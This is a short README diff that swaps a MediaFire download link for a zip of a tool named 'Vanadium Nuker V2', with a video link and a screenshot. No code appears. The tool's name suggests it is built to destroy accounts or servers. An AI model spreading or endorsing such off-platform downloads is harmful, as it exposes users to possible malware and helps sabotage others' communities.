@@ -29,7 +29,7 @@ I'm sorry I can't upload the file to GitHub because the file size is 39 MB, and 
 https://youtu.be/8l57Mxtu9pw?si=fRtKlFa6zDA2koEt
 
 # How To Download?
-https://www.mediafire.com/file/sc5e730rke9x0qw/Vanadium.zip/file
+https://www.mediafire.com/file/fwxdl3qadtfbcg0/Vanadium+Nuker+V2.zip/file
 on this link you can download the tool!
 
 <img width="1454" height="700" alt="Screenshot 2026-01-15 163419" src="https://github.com/user-attachments/assets/60532884-8ef6-48d3-80d7-da645a2ae637" />
